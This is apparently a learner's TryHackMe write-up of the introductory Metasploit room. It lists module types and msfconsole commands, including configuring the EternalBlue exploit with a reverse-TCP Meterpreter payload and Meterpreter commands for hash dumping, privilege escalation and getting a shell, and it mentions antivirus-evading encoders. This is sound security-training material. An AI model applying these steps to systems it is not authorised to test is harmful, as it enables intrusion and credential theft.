# Metasploit Introduction — TryHackMe Writeup

**Path:** Cyber Security 101 — Exploitation Basics
**Difficulty:** Easy
**Date:** March 2026
**Tags:** Metasploit | Msfconsole | Meterpreter | Exploitation Framework | Basics

---

## Room Summary

The Metasploit: Introduction room provides a comprehensive overview of the Metasploit Framework, one of the most widely used exploitation frameworks in cybersecurity. The room covers the architecture of Metasploit, basic commands, how to find and use exploits and payloads, and an introduction to Meterpreter.

---

## Key Concepts & Architecture

Metasploit is built around several key module types:

- **Exploits:** Code that takes advantage of a vulnerability to deliver a payload.
- **Payloads:** Code that runs on the target system after a successful exploit (e.g., reverse shell, Meterpreter).
- **Auxiliary:** Modules for scanning, gathering information, and denial of service (not exploitation).
- **Post:** Modules used after gaining access, for privilege escalation, gathering credentials, or lateral movement.
- **Encoders:** Used to encode payloads to evade antivirus detection (e.g., shikata_ga_nai).
- **NOPs:** Used for buffer overflow exploits to keep payload sizes consistent.

---

## Essential Commands Reference

### Starting Metasploit
```bash
# Initialize the database (important for workspaces and tracking)
msfdb init

# Start the console
msfconsole
```

### Basic `msfconsole` Commands
```bash
# Search for modules
search <keyword>
search type:exploit cve:2017 platform:windows

# Use a specific module
use exploit/windows/smb/ms17_010_eternalblue
use 0 (you can use the index number from search results)

# View details about the selected module
info

# View required and optional settings
show options

# Set module parameters
set RHOSTS <target-IP>
set LHOST <your-IP>
set payload windows/x64/meterpreter/reverse_tcp

# Execute the module
run
exploit    # Same as run
exploit -j # Run the exploit as a background job
```

### Managing Sessions
```bash
# List active sessions
sessions
sessions -l

# Interact with a specific session
sessions -i <session-ID>

# Background the current session
background
# OR use Ctrl+Z
```

---

## Meterpreter Basics

Once a Meterpreter session is established, it provides a powerful, stealthy environment to interact with the target system.

### Core Meterpreter Commands
```bash
getuid      # Display the current user
sysinfo     # Show system information
hashdump    # Dump password hashes (requires SYSTEM privileges)
getsystem   # Attempt to elevate privileges to SYSTEM
shell       # Drop into a standard system shell (cmd.exe or /bin/bash)
download    # Download a file from the target
upload      # Upload a file to the target
```

---

## Methodology / Walkthrough Example

1. **Reconnaissance:** Identify the target service and version using `nmap`.
2. **Search:** Use `search <service name>` in `msfconsole` to find a matching exploit.
3. **Configure:** Select the exploit using `use <module_path>`, then configure `RHOSTS` (target) and `LHOST` (attacker).
4. **Payload Selection:** Check available payloads with `show payloads` and set an appropriate one.
5. **Exploit:** Run the exploit and wait for the session.
6. **Post-Exploitation:** Use Meterpreter to gather info, escalate privileges, or dump credentials.

---

## Key Learnings

- Metasploit uses a PostgreSQL database to keep track of workspaces, hosts, and looted data.
- It's critical to understand the difference between an exploit (the delivery mechanism) and a payload (what executes after).
- Meterpreter is entirely memory-resident, meaning it doesn't write binaries to the disk, which helps evade detection.

---

*Part of my TryHackMe journey — [View my full progress](https://github.com/EthRahul/thm-journey)*
